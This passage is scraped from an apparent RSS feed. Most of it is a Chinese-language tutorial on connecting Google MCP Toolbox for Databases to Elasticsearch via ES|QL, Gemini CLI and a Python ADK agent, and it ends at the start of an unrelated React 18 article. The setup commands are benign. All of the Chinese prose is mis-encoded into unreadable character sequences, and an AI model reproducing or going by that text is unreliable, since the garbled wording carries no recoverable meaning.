<span class="hljs-attr">16.        - name:</span> <span class="hljs-string">name</span>
<span class="hljs-attr">17.          type:</span> <span class="hljs-string">string</span>
<span class="hljs-attr">18.          description:</span> <span class="hljs-string">The</span> <span class="hljs-string">customer</span> <span class="hljs-string">name.</span>

<span class="hljs-attr">20.  toolsets:</span>
<span class="hljs-attr">21.    elasticsearch-tools:</span>
<span class="hljs-number">22</span><span class="hljs-string">.</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">customer-orders</span>

<span class="hljs-string">`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)</span>
</code></pre>
<p>ä½ éœ€è¦å°† <strong/> æ›¿æ¢ä¸ºæœ‰æ•ˆçš„ Elasticsearch API keyã€‚å¦‚æœä½ ä½¿ç”¨ start-local åœ¨æœ¬åœ°è¿è¡Œ Elasticsearchï¼Œå¯ä»¥åœ¨ start-local ç”Ÿæˆçš„ .env æ–‡ä»¶ä¸­æ‰¾åˆ°è¯¥ API keyï¼Œå˜é‡åä¸º <strong>ES_LOCAL_API_KEY</strong>ã€‚å¦‚æœä½ ä½¿ç”¨ Elastic Cloudï¼Œå¯ä»¥æŒ‰ç…§<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fdeploy-manage%2Fapi-keys%2Felastic-cloud-api-keys" title="https://www.elastic.co/docs/deploy-manage/api-keys/elastic-cloud-api-keys" target="_blank" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>æè¿°çš„æ­¥éª¤ç”Ÿæˆ API keyã€‚</p>
<p>å‰é¢çš„ tools åŒ…å«ä»¥ä¸‹ç”¨äº Elasticsearch çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fquery-filter%2Flanguages%2Fesql" title="https://www.elastic.co/docs/explore-analyze/query-filter/languages/esql" target="_blank" ref="nofollow noopener noreferrer">ES|QL</a> æŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`<span class="hljs-keyword">FROM</span> kibana_sample_data_ecommerce <span class="hljs-operator">|</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(customer_full_name, ?name)`AIå†™ä»£ç 
</code></pre>
<p>å¦‚æœä½ ä¸ç†Ÿæ‚‰ ES|QLï¼Œå®ƒæ˜¯ç”± Elastic å¼€å‘çš„ä¸€ç§æŸ¥è¯¢è¯­è¨€ï¼Œç±»ä¼¼äº SQLï¼Œå¯ç”¨äºæœç´¢ä¸€ä¸ªæˆ–å¤šä¸ªç´¢å¼•ã€‚ä½ å¯ä»¥åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql" title="https://www.elastic.co/docs/reference/query-languages/esql" target="_blank" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a>ä¸­äº†è§£æ›´å¤šå…³äº ES|QL çš„ä¿¡æ¯ã€‚</p>
<p>ä¸Šé¢çš„æŸ¥è¯¢ä¼šæœç´¢å­˜å‚¨åœ¨ <strong>kibana_sample_data_ecommerce</strong> ç´¢å¼•ä¸­ã€åŒ…å«æŒ‡å®šå®¢æˆ·å§“åçš„æ‰€æœ‰è®¢å•ï¼Œä½¿ç”¨ <strong>?name</strong> å‚æ•°ï¼ˆé—®å·è¡¨ç¤ºå‚æ•°ï¼‰ã€‚</p>
<p>å®¢æˆ·å§“ååœ¨ä¹‹å‰çš„ YAML é…ç½®ä¸­å®šä¹‰ï¼Œç±»å‹ä¸º stringï¼Œæè¿°ä¸º â€œThe customer nameâ€ã€‚</p>
<p>è¯¥å·¥å…·å¯ç”¨äºå›ç­”æœ‰å…³å®¢æˆ·è®¢å•çš„é—®é¢˜â€”â€”ä¾‹å¦‚ï¼š<em>How many orders did customer Foo place in October 2025?</em></p>
<p>å·¥å…·åŠå…¶å‚æ•°çš„æè¿°å¯¹äºä»ç”¨æˆ·çš„è‡ªç„¶è¯­è¨€è¯·æ±‚ä¸­æå–ç›¸å…³ä¿¡æ¯è‡³å…³é‡è¦ã€‚æ­¤æå–é€šè¿‡ Large Language Model (LLM) çš„ <strong>function-calling</strong> åŠŸèƒ½æ¥æ‰§è¡Œã€‚åœ¨å®é™…æ“ä½œä¸­ï¼ŒLLM å¯ä»¥ç¡®å®šéœ€è¦æ‰§è¡Œå“ªä¸ªå‡½æ•°ï¼ˆå·¥å…·ï¼‰ä»¥è·å–æ‰€éœ€ä¿¡æ¯ï¼Œä»¥åŠè¯¥å‡½æ•°çš„é€‚å½“å‚æ•°ã€‚</p>
<p>å…³äº function calls çš„æ›´å¤šä¿¡æ¯ï¼Œæˆ‘ä»¬å»ºè®®é˜…è¯» Ashish Tiwari æ’°å†™çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F139544698" title="https://elasticstack.blog.csdn.net/article/details/139544698" target="_blank" ref="nofollow noopener noreferrer">OpenAI function calling with Elasticsearch</a> æ–‡ç« ã€‚</p>
<h2 data-id="heading-5">è¿è¡Œ Toolbox server</h2>
<p>ä½ å¯ä»¥ä½¿ç”¨å‰é¢çš„ tools.yaml æ–‡ä»¶é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿è¡Œ MCP Toolboxï¼š</p>
<pre><code class="hljs language-css" lang="css">`./toolbox <span class="hljs-attr">--tools-file</span> tools<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--ui</span>`AIå†™ä»£ç 
</code></pre>
<p>â€“ui å‚æ•°ä¼šåœ¨ <a href="https://link.juejin.cn?target=http%3A%2F%2F127.0.0.1%3A5000%2Fui" title="http://127.0.0.1:5000/ui" target="_blank" ref="nofollow noopener noreferrer">http://127.0.0.1:5000/ui</a> è¿è¡Œä¸€ä¸ª web åº”ç”¨ï¼ˆå›¾ 2ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dd43507748f45aab3c0ed9e65a95c1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=uGs91kN62hLnxT91a8DIHLtogas%3D" alt="" loading="lazy"/> å›¾ 2ï¼šMCP Toolbox UI</p>
<p>ä½ å¯ä»¥é€‰æ‹© Tools &gt; customer-ordersï¼Œå¹¶åœ¨å‚æ•° name ä¸­è¾“å…¥å®¢æˆ·å§“åï¼ˆä¾‹å¦‚ Gwen Sandersï¼‰ï¼Œç„¶åç‚¹å‡» Run Tool æŒ‰é’®ã€‚ä½ åº”è¯¥ä¼šçœ‹åˆ°å¦‚å›¾ 3 æ‰€ç¤ºçš„ JSON å“åº”ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86fda6be990f4b9a930e9b0ce3264dfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=G9udZciatj%2FVS%2B37BLO3gvQUgAI%3D" alt="" loading="lazy"/> å›¾ 3ï¼šä½¿ç”¨ name å€¼ â€œGwenâ€ æ‰§è¡Œ customer-orders å·¥å…·çš„ç»“æœ</p>
<p>è®¾ç½®å®Œæˆåï¼ŒMCP Toolbox å¯ä»¥æ‰§è¡Œ <strong>customer-orders</strong> å·¥å…·ï¼Œä¸ Elasticsearch é€šä¿¡å¹¶è¿è¡Œ ES|QL æŸ¥è¯¢ã€‚</p>
<h2 data-id="heading-6">ä½¿ç”¨ MCP Toolbox ä¸ Gemini CLI</h2>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½• MCP client ä¸ MCP Toolbox for Databases è¿›è¡Œé€šä¿¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle-gemini%2Fgemini-cli" title="https://github.com/google-gemini/gemini-cli" target="_blank" ref="nofollow noopener noreferrer">Gemini CLI</a>ï¼Œè¿™æ˜¯ä¸€æ¬¾ç”¨äºä½¿ç”¨ Gemini çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ä½ å¯ä»¥æŒ‰ç…§<a href="https://link.juejin.cn?target=https%3A%2F%2Fgeminicli.com%2Fdocs%2Fget-started%2Finstallation%2F" title="https://geminicli.com/docs/get-started/installation/" target="_blank" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>çš„è¯´æ˜å®‰è£… Gemini CLIã€‚</p>
<p>Gemini CLI æä¾›äº†ä¸€ä¸ªä¸º MCP Toolbox é¢„é…ç½®çš„æ‰©å±•ï¼Œä½äº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgemini-cli-extensions%2Fmcp-toolbox" title="https://github.com/gemini-cli-extensions/mcp-toolbox" target="_blank" ref="nofollow noopener noreferrer">gemini-cli-extensions/mcp-toolbox</a>ã€‚ä½ å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£…æ­¤æ‰©å±•ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">`gemini extensions install https:<span class="hljs-comment">//github.com/gemini-cli-extensions/mcp-toolbox`AIå†™ä»£ç </span>
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œä½ éœ€è¦è¿›å…¥å­˜æ”¾ MCP Toolbox tools.yaml é…ç½®æ–‡ä»¶çš„ç›®å½•ï¼Œå¹¶æŒ‰å¦‚ä¸‹æ–¹å¼æ‰§è¡Œ Gemini CLIï¼ˆæ­¤æ­¥éª¤æ˜¯ä¸ºäº†è®© Gemini CLI è‡ªåŠ¨é…ç½® MCP Toolboxï¼‰ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`gemini`</span>AIå†™ä»£ç 
</code></pre>
<p>ä½ åº”è¯¥ä¼šçœ‹åˆ°å¦‚å›¾ 4 æ‰€ç¤ºçš„è¾“å‡ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f68e53e89804cf5a92b7126c13e9357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=D%2FaJ4MvJvCUd4ClM%2FcyRSDFZDsQ%3D" alt="" loading="lazy"/> å›¾ 4ï¼šGemini CLI ç»ˆç«¯</p>
<p>ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ MCP Toolbox æ˜¯å¦å·²è¿æ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`/mcp list`AIå†™ä»£ç 
</code></pre>
<p>ä½ åº”è¯¥ä¼šçœ‹åˆ° mcp_toolbox åŠå…¶åˆ—å‡ºçš„ customer-orders å·¥å…·ï¼ˆå›¾ 5ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99ec3fbc9fb64de791bcef4d4adc008d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=BdMW9Pe26A8MzUrEFPcOECOX7U0%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœ MCP Toolbox å·²è¿æ¥åˆ° Gemini CLIï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å°è¯•æå‡ºä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚ï¼šâ€œGive me the orders for the customer Gwen Sanders.â€ ç„¶å Gemini CLI ä¼šè¯·æ±‚æ‰§è¡Œæ¥è‡ª mcp_toolbox server çš„ customer-orders å·¥å…·çš„æƒé™ï¼ˆè§å›¾ 6ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab36fae23e534de5b268cf91c53fc2fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=GU4QqI6u2Rv7SvI46n9oE8wA3nA%3D" alt="" loading="lazy"/> å›¾ 6ï¼šæ‰§è¡Œ customer-orders å·¥å…·çš„æƒé™è¯·æ±‚</p>
<p>ç¡®è®¤åï¼ŒGemini CLI ä¼šå‘ MCP Toolbox æ‰§è¡Œè¯·æ±‚ï¼Œå¾—åˆ° JSON å“åº”ä½œä¸ºç»“æœï¼Œå¹¶ç”¨å®ƒæ¥æ ¼å¼åŒ–å“åº”ï¼ˆå›¾ 7ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a11aa5f9065f48b9b022501b37c873be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=Ipp2rAcq8b%2F5SlJ1C%2BvFd2K9Gog%3D" alt="" loading="lazy"/> å›¾ 7ï¼šæ¥è‡ª MCP Toolbox çš„å“åº”ä»¥åŠ Gemini CLI çš„æœ€ç»ˆå“åº”</p>
<p>æ¥è‡ª Gemini CLI çš„å“åº”ä¼šæ˜¾ç¤º Gwen Sanders åªä¸‹äº†ä¸€ç¬”åŒ…å« 2 ä¸ªäº§å“çš„è®¢å•ï¼Œæ€»ä»·ä¸º 132 eurosã€‚</p>
<h2 data-id="heading-7">MCP Toolbox SDKs</h2>
<p>Google MCP Toolbox è¿˜æä¾›äº† SDKï¼Œå¯ä»ç”¨ Goã€Python å’Œ Javascript ç¼–å†™çš„ç¨‹åºè®¿é—®æ‰€æœ‰åŠŸèƒ½ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒPython SDK å¯åœ¨ Github ä¸Šçš„ä»¥ä¸‹é¡µé¢è·å–ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogleapis%2Fmcp-toolbox-sdk-python%25E3%2580%2582" title="https://github.com/googleapis/mcp-toolbox-sdk-python%E3%80%82" target="_blank" ref="nofollow noopener noreferrer">github.com/googleapis/â€¦</a></p>
<p>æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç®€å•çš„ agent æ¥è¿æ¥ MCP Toolboxã€‚éœ€è¦å®‰è£…ä»¥ä¸‹åŒ…ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  pip install toolbox-core
<span class="hljs-bullet">2.</span>  pip install google-adk

`AIå†™ä»£ç 
</code></pre>
<p>å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ agent é¡¹ç›®ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`adk create my_agent`</span>AIå†™ä»£ç 
</code></pre>
<p>è¿™å°†åˆ›å»ºä¸€ä¸ªåä¸º my_agent çš„æ–°ç›®å½•ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ–‡ä»¶ agent.pyã€‚</p>
<p>ä½¿ç”¨ä»¥ä¸‹å†…å®¹æ›´æ–° my_agent/agent.py ä»¥è¿æ¥ Toolboxï¼š</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  from google.adk import Agent
2.  from google.adk.apps import App
3.  from toolbox_core import ToolboxSyncClient

<span class="hljs-attr">5.  client</span> = ToolboxSyncClient(<span class="hljs-string">"http://127.0.0.1:5000"</span>)

<span class="hljs-attr">7.  root_agent</span> = Agent(
<span class="hljs-attr">8.      name</span>=<span class="hljs-string">'root_agent'</span>,
<span class="hljs-attr">9.      model</span>=<span class="hljs-string">'gemini-2.5-flash'</span>,
<span class="hljs-attr">10.      instruction</span>=<span class="hljs-string">"You are a helpful AI assistant designed to search information about a dataset of ecommerce orders."</span>,
<span class="hljs-attr">11.      tools</span>=client.load_toolset(),
12.  )

<span class="hljs-attr">14.  app</span> = App(root_agent=root_agent, )

`AIå†™ä»£ç !<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>åˆ›å»ºä¸€ä¸ªåŒ…å«ä½ çš„ Google API key çš„ .env æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">echo</span> <span class="hljs-string">'GOOGLE_API_KEY="YOUR_API_KEY"'</span> &gt; my_agent/.env`AIå†™ä»£ç 
</code></pre>
<p>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œ agent å¹¶è§‚å¯Ÿç»“æœã€‚è¦æ‰§è¡Œ agentï¼Œä½ å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">`adk run my_agent`AIå†™ä»£ç 
</code></pre>
<p>æˆ–è€…ï¼Œä½ å¯ä»¥é€šè¿‡ web ç•Œé¢æ¥è¿è¡Œå®ƒï¼š</p>
<pre><code class="hljs language-css" lang="css">`adk web <span class="hljs-attr">--port</span> <span class="hljs-number">8000</span>`AIå†™ä»£ç 
</code></pre>
<p>åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œä½ éƒ½å¯ä»¥ä½¿ç”¨é—®ç­”ç•Œé¢ä¸ MCP Toolbox äº¤äº’ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥æå‡ºä¹‹å‰çš„é—®é¢˜ï¼šGive me the orders of the customer Gwen Sandersã€‚</p>
<p>æœ‰å…³ä¸åŒ SDK çš„æ›´å¤šä¿¡æ¯ï¼Œä½ å¯ä»¥å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogleapis.github.io%2Fgenai-toolbox%2Fsdks%2F" title="https://googleapis.github.io/genai-toolbox/sdks/" target="_blank" ref="nofollow noopener noreferrer">æ­¤æ–‡æ¡£é¡µé¢</a>ã€‚</p>
<h2 data-id="heading-8">ç»“è®º</h2>
<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æ¼”ç¤ºäº† Google MCP Toolbox for Databases çš„ Elasticsearch é›†æˆã€‚é€šè¿‡ä¸€ä¸ªç®€å•çš„ YAML é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ç»„å·¥å…·ï¼Œå°†è‡ªç„¶è¯­è¨€é—®é¢˜è½¬æ¢ä¸ºä½¿ç”¨ ES|QL è¯­è¨€çš„ Elasticsearch æŸ¥è¯¢ã€‚</p>
<p>æˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•ä¸ kibana_sample_data_ecommerce æ•°æ®é›†äº¤äº’ï¼Œè¯¥æ•°æ®é›†åŒ…å«æ¥è‡ªä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fenterprise-search%2Fecommerce" title="https://www.elastic.co/enterprise-search/ecommerce" target="_blank" ref="nofollow noopener noreferrer">ç”µå•†</a>ç½‘ç«™çš„è®¢å•ã€‚ä½¿ç”¨è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¿è¡Œ MCP Toolbox serverï¼Œå°±å¯ä»¥ä»ä»»ä½• MCP client è¿æ¥åˆ°å®ƒã€‚</p>
<p>æœ€åï¼Œæˆ‘ä»¬æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ Gemini CLI ä½œä¸ºå®¢æˆ·ç«¯è¿æ¥åˆ° MCP Toolbox for Databasesï¼Œå¹¶æŸ¥è¯¢å­˜å‚¨åœ¨ Elasticsearch ä¸­çš„ç”µå•†æ•°æ®ã€‚æˆ‘ä»¬æ‰§è¡Œäº†ä¸€ä¸ªè‡ªç„¶è¯­è¨€æŸ¥è¯¢ï¼Œä»¥æ£€ç´¢ç‰¹å®šå®¢æˆ·ï¼ˆé€šè¿‡å§“åæ ‡è¯†ï¼‰çš„è®¢å•ä¿¡æ¯ã€‚</p>
<p>éšç€ MCP ç”Ÿæ€ç³»ç»Ÿçš„ä¸æ–­å‘å±•ï¼Œè¿™ç§æ¨¡å¼â€”â€”è½»é‡çº§å·¥å…·å®šä¹‰ï¼Œä¾æ‰˜å®‰å…¨ã€ç”Ÿäº§å°±ç»ªçš„åŸºç¡€è®¾æ–½â€”â€”ä¸ºæ„å»ºè¶Šæ¥è¶Šå¼ºå¤§ã€å…·å¤‡æ•°æ®æ„ŸçŸ¥èƒ½åŠ›çš„ agents æä¾›äº†æ–°çš„æœºä¼šï¼Œä¸”å‡ ä¹æ— éœ€é¢å¤–å·¥ä½œã€‚æ— è®ºä½ æ˜¯åœ¨æœ¬åœ°ä½¿ç”¨ Elastic çš„ç¤ºä¾‹æ•°æ®é›†è¿›è¡Œå®éªŒï¼Œè¿˜æ˜¯å°†æœç´¢åŠŸèƒ½é›†æˆåˆ°æ›´å¤§çš„åº”ç”¨ä¸­ï¼ŒMCP Toolbox éƒ½ä¸ºä½¿ç”¨è‡ªç„¶è¯­è¨€ä¸ Elasticsearch æ•°æ®äº¤äº’æä¾›äº†å¯é ä¸”å¯æ‰©å±•çš„åŸºç¡€ã€‚</p>
<p>æœ‰å…³ agentic AI åº”ç”¨å¼€å‘çš„æ›´å¤šä¿¡æ¯ï¼Œä½ å¯ä»¥é˜…è¯» Anish Mathur å’Œ Dana Juratoni æ’°å†™çš„ ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152024448" title="https://elasticstack.blog.csdn.net/article/details/152024448" target="_blank" ref="nofollow noopener noreferrer">Elasticsearch æ„å»º AI Agentic å·¥ä½œæµç¨‹</a> æ–‡ç« ã€‚</p>
<p>æœ‰å…³ Google MCP Toolbox çš„æ›´å¤šä¿¡æ¯ï¼Œä½ å¯ä»¥è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogleapis.github.io%2Fgenai-toolbox%2Fgetting-started%2Fintroduction%2F%25E3%2580%2582" title="https://googleapis.github.io/genai-toolbox/getting-started/introduction/%E3%80%82" target="_blank" ref="nofollow noopener noreferrer">googleapis.github.io/genai-toolbâ€¦</a></p>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fgoogle-mcp-toolbox-elasticsearch-support" title="https://www.elastic.co/search-labs/blog/google-mcp-toolbox-elasticsearch-support" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 18å¹¶å‘æ¸²æŸ“å®æˆ˜ï¼š5ä¸ªæ ¸å¿ƒAPIè®©ä½ çš„åº”ç”¨æ€§èƒ½é£™å‡50%]]></title>    <link>https://juejin.cn/post/7582783931164426275</link>    <guid>https://juejin.cn/post/7582783931164426275</guid>    <pubDate>2025-12-13T04:17:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582783931164426275" data-draft-id="7582844980399226920" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 18å¹¶å‘æ¸²æŸ“å®æˆ˜ï¼š5ä¸ªæ ¸å¿ƒAPIè®©ä½ çš„åº”ç”¨æ€§èƒ½é£™å‡50%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-13T04:17:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 18å¹¶å‘æ¸²æŸ“å®æˆ˜ï¼š5ä¸ªæ ¸å¿ƒAPIè®©ä½ çš„åº”ç”¨æ€§èƒ½é£™å‡50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T04:17:24.000Z" title="Sat Dec 13 2025 04:17:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item 